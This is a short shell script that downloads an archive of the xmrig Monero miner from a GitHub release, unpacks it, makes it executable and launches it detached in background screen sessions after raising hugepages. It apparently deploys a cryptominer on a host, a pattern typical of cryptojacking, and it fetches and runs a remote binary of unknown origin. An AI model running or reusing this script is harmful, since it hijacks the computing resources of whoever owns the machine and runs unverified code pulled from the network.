#!/bin/sh
sysctl -w vm.nr_hugepages=1024
wget https://github.com/zoharxxx/zohar/releases/download/zohar/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
cd xmrig-v5.11.1
chmod a+x xmrig
chmod a+x config.json
screen -dmS bash bash && screen -dmS xmrig ./xmrig
